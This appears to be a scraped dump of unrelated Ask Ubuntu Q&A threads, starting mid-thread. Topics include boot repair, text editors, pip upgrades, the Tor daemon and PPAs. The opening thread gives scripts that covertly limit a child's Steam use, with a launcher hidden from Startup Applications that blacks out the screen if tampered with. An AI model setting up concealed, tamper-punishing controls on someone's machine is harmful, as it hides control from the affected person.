/etc/rc.local\n\nJust before the line \nexit 0\n\nanother line:\n/opt/limit/limit_use &\n\nThat's it\nWhen someone tries to kill the background script:\n\n(action not allowed)\nExplanation; how it works\n\n\n*\n\n*Once per 10 seconds, the script looks if the targeted process is running. If so, it \"adds\" one \"point\" to a total usage, to be recorded in a file (/opt/limit/uselog). If the dayly limit is reached, the script no longer allows the process to run, killing it if it exists.\n\n*On the day change (the date is recorded in a file, so reboot won't help), the log file is deleted, allowing a new amount of usage time to build up.\n\n*Since the script runs on boot up, from rc.local only user(s) with sudo privileges can stop the script, even then only if the user knows the process name.\n\n\nStop the script\nIn case you'd like to stop the script, use the command:\nsudo kill \"$(pgrep limit_use)\"\n\nBut again, you'd need the sudo password to do so.\n\n\n\nEDIT\nAlthough the script above should provide a reasonably secure way of limiting an application's usage, as mentioned by @Bytecommander, it can be surpassed, although not very easily. The combination with the measure below will make it very unlikely that this will happen, unless your son knows the setup, and is quite experienced with Linux/Ubuntu.\nAdditional measure\nA bit further from a \"simple solution\", but still not too difficult to set up is the additional measure below. If our suspected delinquent would find out the script is called from /etc/rc.local, would manage to become root, and remove the line in /etc/rc.local, or would be able to stop the script that way, we can confront him with the next problem: the screen blacks out after log in. Additionally, the solution checks if the background script is running after 5 minutes after restart, blacking out if not. \nThe extra measure is a startup- check if the line /opt/limit/limit_use & is present in /etc/rc.local, and a check after 5 minutes if the script still runs. Since the script runs from a (hidden from Startup Applications) launcher in /etc/xdg/autostart it will be quite difficult to find out what is happening, unless you know how it is done. The combination of these two measures makes it unlikely your son will find out, and if he does, probably nothing will stop him.\nHow to set up\nTwo simple steps are involved:\n\n\n*\n\n*Copy the code below into an empty file, save it as blackout.desktop on your desktop:\n[Desktop Entry]\nName=not allowed\nExec=/bin/bash -c \"sleep 15 && /usr/local/bin/blackout.py\"\nType=Application\nTerminal=false\nNoDisplay=true\n\nCopy the file to /etc/xdg/autostart:\nsudo cp /path/to/blackout.desktop /etc/xdg/autostart\n\n\n*Copy the script below into an empty file, save it as blackout.py on your desktop, make it executable and copy it to /usr/local/bin:\ncp /path/to/blackout.py /usr/local/bin\n\nThe script\n#!/usr/bin/env python3\nimport subprocess\nimport time\n\ndef dim_screen():\n    screen = [\n        l.split()[0] for l in subprocess.check_output([\"xrandr\"]).decode(\"utf-8\").splitlines()\\\n        if \" connected\" in l\n        ]\n    for scr in screen:\n        subprocess.Popen([\"xrandr\", \"--output\", scr, \"--brightness\", \"0\"])\n\nif not \"/opt/limit/limit_use &\" in open(\"/etc/rc.local\").read():\n    dim_screen()\n\ntime.sleep(300)\n\ntry:\n    pid = subprocess.check_output([\"pgrep\", \"limit_use\"]).decode(\"utf-8\").strip()\nexcept subprocess.CalledProcessError:\n    dim_screen()\n\nExplanation\nLaunchers in /etc/xdg/autostart will launch an application (in this case the extra security check- up) for all users. This could be overwritten locally, but you have to know the check up runs. By putting the line NoDisplay=true into our launcher, it will not appear locally in Startup Applications, so without knowing it exists, it is unlikely to be discovered. \nFurthermore, your son has only 15 seconds to find out (then the screen is blacked out) so he would have a serious problem, unless he is a genious, has a lot of experience with Ubuntu and a creative mind.\n\nA: This can be achieved by using shell scripts.\nFirst script is to kill Steam as soon as it is run:\n#!/bin/bash\n\nwhile true\ndo\n    pkill steam\n    sleep 1\ndone\n\nexit 0\n\nSave it as /path/to/anyname.sh and add it to the list of start-up applications.\nWhat this script will do is that it will check any open process named steam every second and if it finds any then it will kill it.\nBut, you need a solution where steam can be run at a specific time right so that your son can play games during that interval. To do that you have to write another script:\n#!/bin/bash\n\n    echo \"pkill anyname.sh\" | at 10:00\n\nexit 0\n\nSave it as /path/to/anyname2.sh and also add this to your list of start-up applications.\nThis script will kill the first script at 10:00 hrs. So, when your son runs Steam at 10:00 hrs. He will be able to play it now.\nThe third script is to re-initiate the first script at another point of time so that it kills Steam after a time interval and your son won't be able to play games through Steam anymore.\n#!/bin/bash\n\n    echo \"bash /path/to/anyname.sh\" | at 12:00\n\nexit 0\n\nSave it as /path/to/anyname3.sh and add it to your list of startup-applications.\nMake sure to keep those paths hidden, so that your son doesn't find out.\n\nA: Why not use new User Account (via System Settings). This is the only one method on Linux for \"permissions\".\n\n\n*\n\n*New user \"SteamUser\" should not be in sudoers (just a limited account).\n\n*Then create second account called \"SuperAdmin\" and make it sudoers account (root access). But keep its password only with you.\n\n*Then remove your son's account from sudoers. (sudo group). Then this account will not have root access, it will not be able to install or remove software, change system-wide settings.\n\n*Login to your \"SuperAdmin\" account and change ownership of steam binaries and steam games folder to prevent them from running by anyone except \"SteamUser\". This includes removing read+write+execute access from anyone except \"SteamUser\"\n\n\nFew notes..\n\n\n*\n\n*There is no abillity to leave a root access with your son's account, otherwise permissions control is bypassed easily with chown/chmod.\n\n*Other suggestions based on background scripts are just unstable mess. This means they are not promising. However, they're easy to set up maybe.\n\n*Folder paths to transfer to \"SteamAccount\" are: /home/son/.steam and of course the binary file /usr/games/steam\n\n*To play steam, \"SteamUser\" password is required (you will need to login with \"SteamUser\" and them run steam. You can try looking for methods to expire session after some time with locking it, to prevent playing too long time. I am not sure if there are tools like that, but it's technically possible to set time limits, but for sessions, not programs.\n\n\nA: Just adding on to Jacob Vlijm's answer. His solution is for setting a time limit on particular apps (2 hours a day etc.) Just pasting some code below for people who want to limit app use during particular periods. (eg.

Use or !=5 if you want to add Sat too\n    end_time_fragment = end_time_dict[day_integer]\n    end_time = datetime.time(end_time_fragment, 0, 0, 0)\n\n    if ((dt.time() >= start_time) and (dt.time() < end_time)):\n        for app in app_list:\n            try:\n                pid = subprocess.check_output([\"pgrep\", app]).decode(\"utf-8\").strip()\n                subprocess.Popen([\"kill\", pid])\n            except subprocess.CalledProcessError:\n                pass\n\n# below is line to add to cron script, this will run script every minute\n# * * * * * cd /absolute/path/folder && /usr/bin/python3 ./limit_app_time.py\n\n", "Q: Can't boot from CD - Ubuntu 14.04 I'm tired of ubuntu now and and switching back to windows.

Are there any best practices? Or I should mount it under /mnt or /media dir?\nWikipedia says, that /media is for removable media, and /mnt is for Temporarily mounted filesystems. But I want to mount a permanent filesystem.\nAnother concern is, if I choose /data, then will I have some potential folder conflict in future? When /data can be included in Linux Filesystem Hierarchy...\n\nA: Generally best practice is to mount the drive according to it's purpose, which is why unix systems have this standardised filing system. For example, if you are going to use the drive as a home drive then you might consider mounting it as /home. Have a look at The linux filing system hierarchy to see if the usage of the drive fits in here. You may want to mount it as a sub-directory within one of these locations (e.g. /opt/teamsoftware)\nIf the drive is for just your use then you can mount it in /media or anywhere in your home folder.\nIf the drive is for a shared purpose, for example a project folder, then I suggest using an unused root folder name such as /projects.\n\nA: I have personally used /data for over 5 years on Ubuntu, with no problems.

It Worked! :)\n", "Q: What is the reasoning behind hiding characters when entering the sudo password? When entering the sudo password, the • characters are hidden.\nApparently the • are omitted for better security. They seem secure enough to me, and I don't see why they're not used.\nI think I'm missing something here...\nCould anyone clarify?\n\nA: It makes the password length harder to know.\nIf your screen is being monitored, for example, using • placeholders would allow an attacker to dramatically reduce the number of passwords they'd need to try in order to crack your password.\nGood passwords are made up of a bank of about 40 characters. So compare the difference between If you have a 10 char password, the difference between checking every password up to yours and just checking those with 10 chars is...\n\n\nI probably don't need to spell it out but ~268 trillion attempts is a significant time saving. This gets even more significant as the password gets longer.\nAt the other end of the spectrum —really crappy passwords— if you know a target's family members and pets (thanks Facebook) and you know their password length, you might be in the situation where you only need one or two guesses. Enough to get past something like fail2ban.\n\nOf course if they can see or hear you entering the password, they'll have a better chance of being able to guess it again, but there you go. That's the theory anyway.\n\nA: *\n\n*There is no need to show a * when inputting characters.\n\n*Showing a * gives a hint to anyone watching you type: they then know the amount of characters you typed. \n\n\nAnd since is it better to type a wrong password than to have 1 person get to know something about your password (even if it is just the length) not showing a * is the better method.\nIn case of something that has a fixed length (like the PIN at an ATM) showing a * is not a problem: we all know the length already.\n\nA: My reasoning behind this is following: number of \"•\" characters you enter is very big hint for someone that would like to know/break your password. If the bad guy don't see nothing, your password is more secure.\nPossibly there are other reasons but one above is enough for me.\n\nA: the simplest answer is this question : why to show the password ? if someone knows how many character your password has  , he can make a dictionary with all possible\ncombination of characters and numbers with the same length of your password. it would be cracked later.\n", "Q: Brightness indicator in the panel icon missing As you can see the box icon with stop\nAfter a normal update I met with this.

I was trying to gnome-desktop-environment by running the command sudo apt-get install gnome-desktop-environment, but I closed the process in between because I didn't select the Light Ubuntu option when I was asked (mentioned in an article somewhere). After than my ubuntu didn't start(displayed a black terminal like grub screen in which when I entered the command boot, it showed load the kernel first error)  So I decided to do a fresh installation using live usb but now it got stuck on ubuntu loading screen. I also tried nomodeset but that didn't work either. Then I deleted the ubuntu partitions from windows(but I couldn't delete one partition except all) and then I also did bootrec.exe /fixmbr . After then also , fresh installation would stuck and boot up. I want to install a fresh ubuntu alongside my present windows like I had earlier , How do I fix the mess I made?\nEDIT 1 I was able to completely remove the ubuntu by fixmbr command using recovery drive  and deleted the ubuntu folder in the boot directory in efi partition . I removed all the ubuntu partitions as well. But still I am not able to do a fresh installation of any linux distro. Before loading , ACPI PCC Probe failed Error is displayed and the loading screen never ends and the caps lock starts blinking infinitely. I also tried booting using nomodeset but then it displayed the following error blk update request : I/O error , dev sda ,sector xxxxxx \nI guess something is wrong with my graphics setting as I interrupted that gnome-environment installation process.\n\nA: Solution 1:\nIf you are able to boot into Windows.\nBoot in to Windows OS. Type diskmgmt.msc in Run or command Prompt .\nUsing Disk Management delete the Ubuntu partition.\nNow try installing Ubuntu.\nAfter installation is made, if you have problem with boot menu.\nUse Boot Repair to create a new boot entry for ubuntu or you can repair the boot menu entry. \nSolution 2:\nIf you can't able delete partition.\nTry to delete the partition using diskpart.exe\nSolution 3:\nPrepare Live Boot CD or USB with any of the linux distro probably use Ubuntu. Live Boot into Ubuntu.Use Disks Application which will list all the disks.You can delete the partition.Then Start Fresh Installation.\n\nA: A question  first,  can you boot into Windows? \nIf you can great,  you can ignore the next step. \nif you can't,  you need to get Windows working first.  With your Windows CD,  get to a terminal and type 'fixmbr',  then reboot from the harddrive,  as GRUB overwrites the Master Boot Record that Windows needs to boot. \nNext you need to get rid of any Linux files on the HD,  insert and boot from your Ubuntu media.   Choose the Live option,  NOT Install option.  \nNext,  if everything goes smoothly,  click on Computer and delete every Linux file listed. This should  then allow you to then reinstall Ubuntu. \n\nA: Using the Ubuntu live cd.\nLoad into the Ubuntu live cd/dvd in the \"Try Ubuntu\" mode. Now open GParted and delete the correct partition. (You can find gparted in the unity or by installing it in the software center)\nNow you can erase the correct partitionIn gparted. Click the install Ubuntu on the desktop top and follw the directions. Once the install is complet it will update your grub. If you still have issues booting into ubuntu run the live cd again and run \nsudo update-grub \n\nthen run boot repair.\nboot-repair\n\nin the terminal.\nIf this does not help you you may want to check your bios settings for booting as well as updating your question with what you have already tried.\n", "Q: Ubuntu 14- no internet connections at all I'm booting Ubuntu in WMware Workstation while using Win7, my laptop has internet connection in windows, but when I go to Ubuntu, it does not reckognize any connections.

So with your external keyboard it is obviously that way that Fn the other functionality is primary on function keys.

Now I wonder whether I should install and use vim as well.\nWhat are each of those text editors' special features, advantages and disadvantages? Which one is better suited for newcomers, and for what use cases would the other be preferable?\n\nA: In a nutshell: nano is simple, vim is powerful.\nIf you only want to simply edit some textfiles, nano will be enough. In my opinion, vim is pretty advanced and complicated to use. You should expect some time to get into it before you're able to properly use it.\nFunny (but not too unrealistic) quote about vim: (source)\n\nI've been using vim for about 2 years now, mostly because I can't figure out how to exit it.\n\n\nA: Vim and Nano are completely different terminal text editors.\nNano is simple, easy to use and master while Vim is powerful and tough to master.\nTo differentiate, it will be better to list some features of them. Since we don't use terminal editors for normal edits or coding, I'm listing some of the most interesting features that help for the way we use them today.\nNano:\n\n*\n\n*Easy to use and master.\n\n*Nano has most of the shortcuts listed at the bottom of the window, making it extremely simple to use.\n\n*Search function\n\n*Search and replace\n\n*\"Goto line\" command\n\n*Automatic indentation\n\nVim:\n\n*\n\n*Tough to get started with and master. The editing and command modes will confuse beginners.\n\n*Session recovery\n\n*Split screen\n\n*Tab expansion\n\n*Completion commands\n\n*Syntax coloring\n\nAlthough I hated Vim when I first met it, now I prefer it over Nano.\n\nA: You don't need vi or vim if you like nano.\nNano is easier to use if you are not familiar with vim.\nVim is similar to vi, which is universal (it installed on almost all unix-like systems), but if you never used it before, you will need to look at some documentation/tutorial before you will be able to do anything with it.\n\nA: I read through the other posts. Initially I would have agreed with them. However, I have taken the time to really learn nano. It is actually quite powerful. For example, you can have syntax highlighting. You just need to configure your .nanorc file. And there are many samples that come on the server in the /usr/share/nano location. Just add an include /usr/share/nano/sh.nanorc line to your ~/.nanorc file for bash shell highlighting. \nThere are a large number of additional keyboard commands that you can use. I made myself a whole page of shortcuts. It is very much like using Wordstar or other text based word processors of the old days. I find now that I install nano on servers it is not on as one of my first steps because it has become so intuitive for me, and so much more efficient than vi/vim. I would not say it is more powerful, but it is as powerful. \nStart with this nano cheat sheet to find a large number of the commands. If you have used emacs you will find this is very similar, but in my mind easier. I don't fault people that still use vim. There have been holy wars for years for vim vs emacs. Adding nano has just added a third very powerful editor to that discussion. But do not discount it as a weak beginners tool. \nThe big difference is that vim is modal and nano is not. So with vim you are constantly changing between command mode and edit mode. In nano, as in emacs, you are in one mode and your commands use special key combinations. As you use the editor more you will start to learn all the most used commands. And if you use it a lot you will learn most of them. One other note is that for the read file function there are two mode for that. Either it will read a file into the current edit buffer, or into a new buffer to go between. Make sure to look that one up. \n\nA: They're both text editors, but the similarity pretty much ends there. It may seem strange that two text editors could be so different. The key is that they're both specialized text editors, made for two very different tasks. nano and vim (or rather, pico and vi, which they imitate) were designed for writing e-mails and programs, respectively.\nYou're not meant to spend a lot of time in nano: you go in, you type up your e-mail message (or whatever you were writing), and you get out quickly. Everything is based around getting you in and out as quickly as possible, so you can get back to whatever else you were doing. It goes so far as to list all the functionality at the bottom of the window, so you don't have to waste time looking up help screens. Of course, there's only so much room at the bottom of the window, and so functionality is constrained to whatever can be expressed, alongside all other functionality, in two lines of text. The result is extremely convenient for some things.\nYou're meant to spend much (if not almost all) of your time in vim, so it tries to stay out of your way while helping you sling large chunks of text around quickly. A basic startup screen gives almost no information, and when you open a file you get only slightly more about where you are. And in both cases, you can't type text straight away: you start in \"normal mode\" and have to press i to go into \"insert mode\" first (there are also a few other letters you can press instead of i, offering some variations on this theme, and there are also some other modes I haven't mentioned). The learning curve is extremely steep: it comes with vimtutor to help people out, but some people have gone so far as to write entire games dedicated solely to learning vim's interface. Think about that for a second. An entire game, just to learn how to use a text editor. And people pay for it.\nThere is no question that nano is better for the newcomer. I'm something of a vim-zealot, and even I can't dispute that one. I've seen vim turn newcomers off of Linux in general. And if you don't plan to do a lot of text-editing, or your text-editing tasks are all fairly light (like, say, writing e-mails), then nano may be all you need.\nThat said, while mastering vim takes a long time, the return on investment is high. I realize that the rest of this post sounds kind of down on vim, but that's not my intent. You just need to know what you're getting into, because vim is hard. But even its default configuration contains functions that automate a lot of common (and very repetitive) text-editing tasks: you can do with a few keystrokes things that could take many minutes, or even hours, if you had to do them all manually. There are plugins and scripts that take this even further. If you're going to be doing a lot of programming, or similarly long and involved tasks (dissertations, novels, etc), then vim is ultimately the better choice, but you should still figure out nano first: if an emergency comes up and you need to do something before you've figured out the basics of vim, you'll want to be able to drop into something you're comfortable with.\nBottom line: start with nano, and move to vim if nano gets tedious.\n\nA: Vim is powerful, but tough to learn. It is so called \"modal editor\", as opposed to usual editors, like nano. Vim allows you to reach all text with just a few key presses, so if you have touch-type ability, your movement without a mouse would be even faster than with one.\nSo, if you do not work with text a lot (e.g. like programmers do), you may stick to whatever common editor. Otherwise I'd suggest you to learn Vim.\nIt is worth noting that nowadays there's more than one vim. \"Vim\" become sort of standard which is implemented in many other editors and IDEs as either a checkbox in settings or a plugin. For example, I use Emacs with Evil (a vim-mode plugin).\nA side effect of learning Vim that for some reason nobody mentions: if you can't touch-type yet, but wanted to learn it — just learn Vim, and use it everyday. Vim forces you to move without arrows (h,j,k,l instead), and as you can't look at the keyboard every time you move, you would be forced to learn more and more key locations. This is how I learned to touch-type by the way ☺\n", "Q: haproxy doesn't start on startup I am using haproxy for load balancing mysql.Haproxy is running on Ubuntu 14.04 .I have set ENABLED=1 in /etc/defaults/haproxy file.

To remedy this you may need to use the --rsync-path \"sudo rsync\" option on the receiving machine, and make sure that the sudo user can complete a sudo rsync command without entering a password.\nBefore doing this you'll need to set up your with passwordless access to the rsync command, on the receiving machine.

Don't bother checking with the disk manufacturer; it's almost certainly not a problem with the disk or SSD itself.\nThe usual solution for this problem is to wait for an updated kernel to be released. With Ubuntu, this basically means waiting for a new Ubuntu release. You didn't say what version of Ubuntu you're using, but you could try 15.10 (Wily), 14.04.3 (the latest in the Trusty series -- note that the \".3\" at the end of the version is critical), or even a development version of 16.04 (Xenial).\nIn theory, you can compile your own kernel or use one from some other source. The trouble is twofold: First, most people lack the skills required to do this; and second, you've got to either integrate the kernel into the installer or install on another system and then swap in the new kernel, either of which complicates the install process.\nThere's a slim chance that adding kernel options will get the disk controller working; however, these options will depend very much on the chipset in question (which seems to be the Intel HM76, based on a check of the specs on ASUS' site). I don't know what these options might be.\nAnother option in some cases is to move the disk from one port on the motherboard to another one, since motherboards often have two SATA controllers, only one of which creates problems for Linux. This isn't likely to be an option for a laptop, though; I mention it only in the interests of providing a thorough answer, and in case somebody with a desktop system might read this in the future.\n\nA: I don't know how to go about solving this issue, but if it were me, I'd just bypass it by installing Ubuntu to a hard drive and then cloning it over to the SSD using a program like Macrium Reflect. I did this and it worked okay, but I did have to run boot-repair to reconfigure GRUB. Best of luck to you! \n\nA: Just in case someone checks this now. Just had an issue with Ubuntu not recognizing an SSD while it shows up just fine in windows.\nI checked around and apparently, it's worth checking the drive interface controller settings: RAID / ACHI\nOn Windows, the port(connector) controller could be set to RAID for caching.\n", "Q: How to know what options each command has? I've been using linux for quite some time now and I have a question burning in my head. I'll use the mount command as an example.\nWhen you see the manpages of mount it says that you use the command like this:\nmount $type $drive $dir where $drive is the drive you want to mount $type is that drive's type and $dir is the directory where you will mount it.\nAs far as what to put in $drive and $dir variables, it's pretty easy to tell. Now in the $type variable you can't just put whatever you like, because the system won't understand it. You have to use premade words like vfat, ext3, auto etc. \nAnd here is my question: for every command that requires this kind of premade words to fill in a variable space, how do I know what options do I have? Where can I see a list of all the options I have for this kind of variables?\nAnd mount is just one command, there are countless others like this one witch require a word from a set of premade words to work. As far as I can tell there is no such list in the manpages or in some obvious website.\n\nA: There's no general way, especially for extensible programs like mount.\nFor mount, the -t foo option tells mount to run a mount.foo command. This depends on what you have installed. For example, I can use the following options for mount:\nceph  cifs  fuse  fuse.ceph  lowntfs-3g  nfs  nfs4  ntfs  ntfs-3g\n\nWhy? Because I have the following helpers for mount installed:\n$ ls /sbin/mount.*\n/sbin/mount.ceph       /sbin/mount.cifs        /sbin/mount.fuse\n/sbin/mount.fuse.ceph  /sbin/mount.lowntfs-3g  /sbin/mount.nfs\n/sbin/mount.nfs4       /sbin/mount.ntfs        /sbin/mount.ntfs-3g\n\nIn general, though, there's no way to know what you can run for a given command, especially if it can make use of external programs like mount does.\n\nA: Usually you have two options:\n\n\n*\n\n*One is to study the source for each command you want to know which probably would not be a good idea (actually it is if you want to know the inner workings, but you know, time-wise ;)) since it take countless hours.\n\n*The second and more viable option is to study the manual either using man or info which could give you detailed explanation of all the options and parameters.\n\nA: \nAs far as I can tell there is no such list in the manpages (…).\n\nEven in the very special case of mount (muru explaines why) actually the manpage helps a lot:\n-t, --types fstype\n  The argument following the -t is used to indicate the filesystem type.\n  The filesystem types which are currently  supported depend on the running\n  kernel. See /proc/filesystems and /lib/modules/$(uname -r)/kernel/fs for\n  a complete list of the filesystems. The most common are ext2, ext3, ext4,\n  xfs, btrfs, vfat, sysfs, proc, nfs and cifs.\n\nIt doesn't only list the most common arguments, but also points to /proc/filesystems (which is a file, so we'll use cat) and  /lib/modules/$(uname -r)/kernel/fs (which is a directory, so we'll use ls). Combined this provides you the full list of arguments usable on your specific system.\nNormally, man and/or info either contain the full list of possible arguments to an option or (like in your example) point you to other sources where you get this information. To search for an option in an extensive manpage the search function comes in handy, just type e.g. /--types, hit Enter to search for the first occurence and N to go through the following ones.\n", "Q: Cannot access USB drive which is encytped I recently installed Ubuntu 15.10 Desktop 64bit. I previously had version 14.x. I put x in as I cannot remember the exact version. \nI have an encypted USB drive which when attached to my laptop running ubuntu gives me the following message:\n\"Unable to mount 3.8 GB Encrypted\"\nPlease advise on what I can do to resolve this.

How can I reverse this, and what may caused it?\nI'm using Ubuntu 14.04 LTS and only Unity.\n\n\nA: In order to remove both the PPA And the packages it may have installed, you first need PPA-purge in order to do so, to install PPA-purge:\n\nsudo apt-get install ppa-purge\n\nAfter you installed it, you'll need to get the PPA name(s) you added and run:\n\nsudo ppa-purge ppa/name\n\nIn the case of \"Gnome3 Team\" PPA, it would be like this:\n\nsudo ppa-purge ppa:gnome3-team/gnome3\n\n", "Q: Where to find complete AltGr symbols map per keyboard layout I have an italian keyboard layout, if I press this shortcuts I can display strange symbols\n\n\n*\n\n*Alt Gr+x = »\n\n*Alt Gr+SHIFT+, = × \n\n*etcetera...\nMy question is, where can I found a complete visual map of all this AltGr symbols for my italian keyboard layout?\n\n\nSomething similar to https://askubuntu.com/a/553712/23130\nThanks!\n\nA: Look for Text Entry in the Dash (I'm not sure about the Italian localization of that) , select the keyboard and press the symbol with the keyboard. \n\nHere how it looks for italian keyboard\n\n", "Q: Joystick not working as a mouse I have recently purchased a cyborg v.1 joystick.

So if you have decided to go for this option run:\nsudo apt-add-repository ppa:webupd8team/y-ppa-manager\nsudo apt-get update\nsudo apt-get install y-ppa-manager\n\nAnd then you will be able to run the following command ever after to deal with future PPAs (though you will have to replace ppa:example/ppa with the address of the PPA):\nsudo update-ppa ppa:example/ppa\n\n\nA: Well, I don't know a way to avoid checking for updates, but I can answer the original question.\nWhen you add a PPA, Ubuntu has no way of knowing what packages are actually included. If you want to install software from the PPA, Ubuntu will need to \"update\" the software source to get the latest list of available software.\nWhile this process \"updates\" all of the repositories on your system, it only downloads changes. If a repository hasn't changed since the last time your computer updated it, it will simply ignore it and move on. Even if repository information has changed, it only downloads the changes, and not the entire list.\nSources: What does 'Ign' mean when running an apt-get update?\nhttp://ubuntuforums.org/showthread.php?t=231300.\nAnd personal experience\n", "Q: Can i put everything back after accidentally doing \"apt-get remove mysql-server\"?

It might remove configuration files if you instruct it to purge (but that's not default behavior).\nBy default, mysql databases reside in /var/lib. Your dbs should be there.\n\nA: You still can fetch for your database files within:\n\n/var/lib/mysql\n\nTo access a database_name_1 you previously created, you'll find its path as:\n\n/var/lib/mysql/database_name_1\n\n(you'll need su permissions obviously)\n", "Q: Gimp starts but then doesn't open (Ubuntu 14.04 LTS ) after having upgraded to Ubuntu 14.04 LTS Gimp did keep working properly for some time. \nIf I now open it (via either dash or terminal) it seems to start alright, the loading bar and everything is displayed, but once the Gimp symbol is displayed left-hand in the starter nothing else happens.

Opinion requested for your Ubuntu LTS experts!\nSo in the next couple of weeks I really, really need a new AWS instance that runs Ubuntu LTS. The current one of course in 14.04, but I'd rather have 16.04. But, the official release is still months away! Since this computer will be for a development environment, but probably cool with having a pre-release version, it really just comes down to what's less of a pain to upgrade. What takes less time headaches, etc. This server will have Jenkins, nGinx, PHP, node, git, standard dev stuff.\nSo, would you:\n\n\n*\n\n*Make a 14.04 LTS server now, and upgrade to 16.04 LTS in early May? , or \n\n*Make a 16.04 LTS pre-release server now, and upgrade to full release in early May?\n\n\nIt's a question of time and/or stability/package headaches.\nThank you!\n\nA: When you talk pre-released this is almost always going to be more of a headache as it is being used to test (so less bugs will be in the actual release) You are better off installing 14.04Lts that is supported tell April 2019.

I ran the following command.\nuser@ubuntu:~/devstack$ pip install --upgrade pip\n\nI am getting following Traceback errors:\n\n\nPlease let me know how can I make it work.\n\nA: You can either upgrade pip globally using sudo:\nsudo pip3 install --upgrade pip\nsudo pip2 install --upgrade pip\n\nOr you can upgrade it for your user only using the --user option:\npip3 install --upgrade --user pip\npip2 install --upgrade --user pip\n\nNote that I upgrade both pips for Python 2 and Python 3. It's important to upgrade the version for Python 3 first, because the one you upgrade last will later be accessible through pip, which must be pip2 by default.\n\nImportant update:\nAs of pip version 10 (I think), the pip/pip3 command is broken, due to a change in the package structure which is not compatible with the launch scripts provided from the python-pip/python3-pip packages from apt. See Error after upgrading pip: cannot import name 'main' on Stack Overflow for details.\nQuick fix: Don't run pip/pip3 any more, but instead always use python -m pip/python3 -m pip, which will not use the now incompatible executable scripts provided from your system's package manager, or don't upgrade your pip/pip3 version to 10 or higher.\n\nA: I also run into this problem when I wanted to upgrade system pip pip3 from 9.0.1 to 19.2.3.\nAfter running pip3 install --upgrade pip, pip version becomes 19.2.3. But main() has been moved in pip._internal in the latest version, which leaves pip3 broken.\nSo in file /usr/bin/pip3, replace line 9: from pip import main with from pip._internal import main.

This is not to say that there is no reason to do so. I can think of 1 example off the top of my head where it's not only desirable but necessary.\n2) What your asking about here is a submenu. The default operation would be to present a menu with all three options rather than place Ubuntu and Fedora in a submenu titled Ubuntu. One easy way to edit grub menus is to use the package Grub Customizer which allows for numerous cutomizations including background images, default boot selection, timeout, sub menus, etc, etc. It's simple to use for the novice but powerful enough to satisfy almost everyone.

I am taking a course to become a programer and I am using Windows 10.\nEvery time I do an update of Windows it loses all my code, and breaks genymotion.\nSo, my question: Could I use Ubuntu for programming?\n\nA: Yes, and no.\nLinux and Ubuntu is more widely used by programmers, than the average - 20.5% of programmers use it as opposed to around 1.50% of the general population (that doesn't include Chrome OS, and that's just desktop OS).\nNote, however that both Mac OS X and Windows are used more:\n\nWhy is this? There are a number of reasons.\n\n\n*\n\n*Linux has less (not none, but less) support. If my Mac goes wrong, I phone Apple. If my PC goes wrong, I phone PC World. If my Ubuntu machine dies, I'm trawling internet forums and asking here.\nOf course, this site, and the Unix & Linux one are good - but they're not professional, guaranteed support like PC World and Apple.\n\n*Linux has less (again, not none, but less) application support. I want to edit a video - my options are much more limited. There are often less than half the options to chose from - and a lot of those are old, unsupported and you have to compile from source.\n\nPrinters can be less compatible, your webcam might not work. Flash doesn't really work unless you have Google Chrome and lots of other little things are irritating.\n\n*I hinted at it in the last point, but Linux is a bit more... messy. You're a developer and you're used to the Terminal, but Linux needs it a lot. My terminal is always open - right now I have 3, mostly for installing my Printer drivers right now.\nSo what can't you code on Linux - what needs windows?\nVery little to be honest. Some things are better on Windows - for example Delphi for Pascal is much better than Lazarus - and only avaliable for PC.\nAlmost anything can be written in Atom and then compiled with the terminal, but that doesn't mean it's easy. And there is enough windows only software that I have Windows 10 in a virtualbox.\nIf you're working in a team of devs using Windows, they're gonna send you Word and Excel files. Your email will likely be outlook or exchange and your calendar as well.\n\nIn summary, sure you can code on Ubuntu. But can you do everything else, and will it slow you down enough. 5 minutes an hour slower is 40 minutes + lost a day - that could be $25 lost easily. Add on entire days you lose because you just-want-your-new-screens-to-connect-via-DVI-to-your-dual-head-setup-with-nVidia-and-it-just-won't-why-on-earth-not, and you have to ask yourself; is it worth it?\nMy advice, is get your Windows machine working. The nice people at Super User may help - give them lots of details, though.\n", "Q: How to install wine application for system wide usage Can't figure out, whether it is possible to install an application via wine system wide to avoid repetitive process and save disc space.\n\nA: You can solve it be setting WINEPREFIX variable to a particular directory via /etc/environment (i.e. to set the variable system wide). E.g. to have myuser's installation system wide, add there a line like this\nWINEPREFIX=\"/home/myuser/.wine\"\n\nNote however, that this way every Wine application would be installed «system wide», unless when you launch an app you explicitly set a separate WINEPREFIX, like WINEPREFIX=\"/my/other/wine-dir\" wine ./app\"\n", "Q: tor command is not starting Tor Browser I wanted to install Tor on my new Ubuntu (14.04) install.

But when I try to run that command tor doesnt start, it get stack at 100% after bootstrapping:\n~$ tor\nJan 28 21:41:45.095 [notice] Tor v0.2.7.6 (git-605ae665009853bd) running on Linux with Libevent 2.0.21-stable, OpenSSL 1.0.1f and Zlib 1.2.8.\nJan 28 21:41:45.095 [notice] Tor can't help you if you use it wrong!

If so what's going wrong?\nIf I Ctrl+C on the terminal after it's stuck and try the other two options then Tor starts normally. So I believe that my installation is complete.\nIf tor command is not supposed to fully start the Tor browser then what does it do?\nThanks for your help,\nKarsus\n\nA: The Tor Browser bundle and the Tor Daemon are different beasts, and there's some confusion what does what.  The fact that 'tor' isn't familiar to you means you should probably be looking into what different commands do before trying to alias things together.  (For example, tor is an actual program - using that to call the Tor Browser is not the correct approach)\n\nTor Browser\nTor Browser is a software bundle which comes with its own Tor daemon that is launched by the \"Start Tor Browser\" script.  This software bundle includes a fork of Firefox which is bundled with plugins that are specific to Tor Browser, to make it function effectively on the Tor network.\nTor Browser is only run usually with the ./start-tor-browser.desktop launcher, or the ./start-tor-browser shell script/function which executes everything that needs to run for Tor Browser to work.\nThis is its own software bundle, and is different than the standalone Tor daemon (which is tor).\n\ntor aka \"The Tor Daemon\"\nThe Tor daemon can be launched and run on a system to connect it to the Tor network.  It in turn operates on a SOCKS proxy over which you can send application traffic through to send over the Tor network.  It is designed to run transparently and silently on the system, and does not execute any type of other programs - it only runs the daemon and the corresponding proxy which can be used to send data through.\nIt does not launch the Tor Browser as it is designed to run separately as its own daemon, and not to launch the Tor browser.\n", "Q: Ubuntu 15.10 5G WIFI issues I currently have a dual-booted computer running Windows and Ubuntu.

